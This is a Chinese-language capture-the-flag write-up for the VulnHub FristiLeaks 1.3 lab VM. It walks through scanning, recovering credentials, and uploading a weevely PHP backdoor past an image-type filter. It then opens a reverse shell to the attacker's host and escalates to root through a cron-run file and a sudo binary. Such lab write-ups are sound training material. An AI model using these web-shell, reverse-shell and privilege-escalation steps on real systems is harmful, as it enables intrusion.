本地笔记地址：

F:\学习资料\hacker\学习笔记\ctf\writeup\vulnhub-fristileaks1.3

[TOC]



# 准备工作

下载镜像，镜像地址是

https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova

相关的介绍页面是

https://www.vulnhub.com/entry/fristileaks-13,133/#download

使用vmware启动镜像后，若成功，会在界面中出现获取到的ip地址，若未出现，说明网卡配置存在问题，需要重启通过单用户模式，修改网卡的配置，重新获取ip地址信息。

# 开始渗透

## 端口扫描

首先来发现该ip，可以通过kali自带的命令来完成，比如arp-scan , nmap , netdiscover

```
netdiscover -r 192.168.51.0/24
nmap -sn 192.168.51.0/24
arp-scan 192.168.51.0/24
```

![1536486603832](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536486603832.png?raw=true)

确定目标是192.168.51.152

接下来进行端口扫描工作

```
nmap -sS -v -T4 -sV 192.168.51.152
```

![1536486809534](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536486809534.png?raw=true)

# 信息收集

发现它只开放了80端口，通过浏览器打开查看

![1536486866946](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536486866946.png?raw=true)

查看源代码，并未发现任何有用的信息。

首先目录扫描一波这个网站

```
dirhunt -t 10 --max-depth 5 http://192.168.51.152
```

![1536487050073](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536487050073.png?raw=true)

第一次目录扫描发现它存在

```
http://192.168.51.152/sisi
http://192.168.51.152/beer
http://192.168.51.152/cola
http://192.168.51.152/images/

```

其中`/images`目录存在目录浏览的漏洞，但是只有两个图片

![1536487214603](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536487214603.png?raw=true)

查看图片，`3037440.jpg`

![1536487360581](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536487360581.png?raw=true)

`keep-calm.png`

![1536487385345](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536487385345.png?raw=true)

将两张图片下载到本地

使用在线ocr图片识别网站进行图片识别，将图片中的文字识别出来。

http://ocr.wdku.net/

https://www.onlineocr.net/

将识别出来的文本做成字典

```
keep
calm
and
drink
fristi
```

重新进行目录扫描

```
dirb http://192.168.51.152 zidian.txt
```

![1536488715644](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536488715644.png?raw=true)

找到新的目录

```
http://192.168.51.152/fristi/
```

![1536488737422](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536488737422.png?raw=true)

发现是一个后台目录。

# 开始入侵

根据上面收集到的数据来看，目前最有可能突破的就是后台目录

```
http://192.168.51.152/fristi/
```

查看源代码，发现如下提示

```
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
```

以及后台页面中的图片进行了base64编码。

还发现了一段base64编码

```
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0klS0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+fm63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJZv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvbDpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNdjJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg104VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLqi1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2FgtOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HKul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12qmD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFheEPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJRU5ErkJggg==
```

在kali中解码base64

```
base64 -d encode.txt
```

发现这是一个png图片

```
base64 -d encode.txt > encode.png
```

查看该图片

```
feh encode.png
```

![1536489293305](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536489293305.png?raw=true)

看上去是一串字符串，根据第一个提示，猜测这个是eezeepz的密码

```
eezeepz/keKkeKKeKKeKkEkkEk
```

前往后台尝试登陆，成功登陆

![1536489419727](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536489419727.png?raw=true)

是一个上传按钮，尝试上传一个php木马

```
weevely generate 123 /ziliao/ctf/fristileaks1.3/backdoor.php
```

发现无法上传，只支持上传图片文件

![1536489675464](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536489675464.png?raw=true)

将刚刚的文件，更改为png文件

```
cp backdoor.php backdoor.php.png
```

再次上传，发现上传成功

![1536489751669](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536489751669.png?raw=true)

尝试执行命令

```
weevely http://192.168.51.152/fristi/uploads/backdoor.php.png 123
```

![1536489943812](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536489943812.png?raw=true)

成功获得shell，不过目前是eezeepz用户，需要进行提权

尝试查看/home目录

![1536490035637](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536490035637.png?raw=true)

发现存在三个用户，目前我们只可以访问eezeepz用户的目录，先查看该目录

我们先利用上传的文件反弹shell到本地，方便操作

```
在weevely模式下
backdoor_reversetcp 192.168.51.119 1234
# 其中192.168.51.119为我的kali攻击机的本地ip
```

在那之前，我们需要先将bash环境进行临时的定义，不然查看和操作的时候不是很方便。

```
python -c ‘import pty;pty.spawn(“/bin/bash”)’
```

查看eezeepz目录下的内容

![1536490880505](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536490880505.png?raw=true)

发现notes.txt文件属于自定义的文件，因此进行查看

大概意思就是说/home/admin目录下可以操作一些系统命令，并且只需要在/tmp/runthis下输入对应的命令，就可以以admin用户的身份权限执行命令。

那么我们执行以下命令。

```
echo "/home/admin/chmod -R 777 /home/admin" >/tmp/runthis
```

稍等一下，可以发现成功进入admin目录

查看admin

![1536491100048](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536491100048.png?raw=true)

发现存在几个可疑文件

```
cryptedpass.txt
cryptpass.py
whoisyourgodnow.txt
```

分别查看

```
more whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG
```

```
more cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq
```

```
more cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult

```

分析如上情况，可以推断出上述两个文件的内容应该是通过这个python脚本进行加密的，我们需要写一个解密的脚本

```
import base64,codecs,sys
def decodeString(str):
	rot13crypt=codecs.decode(str[::-1], 'rot13')
	return base64.b64decode(rot13crypt)
print decodeString(sys.argv[1])
```

```
python decode.py mVGZ3O3omkJLmy2pcuTq
thisisalsopw123

python decode.py =RFn0AKnlMHMPIzpyuTI0ITG
LetThereBeFristi!
```

那么现在我们获得了两个字符串

```
LetThereBeFristi!
thisisalsopw123
```

我们猜测它是fristigod用户的密码

接下来，让我们尝试登陆到fristigod用户

```
su - fristigod
使用密码：LetThereBeFristi!
```

成功登陆，查看一下目录内容

```
ls -alh
```

发现一个目录和一个文件，分别进行查看

![1536492082573](https://github.com/littleheary/vulnhub-writeup/blob/master/vulnhub-fristileaks1.3/1536492082573.png?raw=true)

```
cd  .secret_admin_stuff
ls -alh
```

发现存在文件doCom,并且具备执行权限，疑似为一个执行文件，接下来查看.bash_history文件

```
more .bash_history

ls
pwd
ls -lah
cd .secret_admin_stuff/
ls
./doCom 
./doCom test
sudo ls
exit
cd .secret_admin_stuff/
ls
./doCom 
sudo -u fristi ./doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
sudo /var/fristigod/.secret_admin_stuff/doCom
exit
sudo /var/fristigod/.secret_admin_stuff/doCom
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
groups
ls -lah
usermod -G fristigod fristi
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
less /var/log/secure e
Fexit
exit
exit
```

看上去，这个doCom文件似乎是可以具备root权限，执行对应的命令，执行格式为

```
sudo -u fristi ./doCom 命令
```

我们创建这样的一个命令

```
cd /var/fristigod/.secret_admin_stuff/
sudo -u fristi ./doCom chmod -R 777 /root/
```

没有回显，疑似执行成功，前往root目录尝试

```
cd /root/
ls
```

发现有一个文件`fristileaks_secrets.txt`

查看

```
more fristileaks_secrets.txt
```

成功获取到root的权限，并且拿到flag

```
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```

到此为止，完成本次练习。



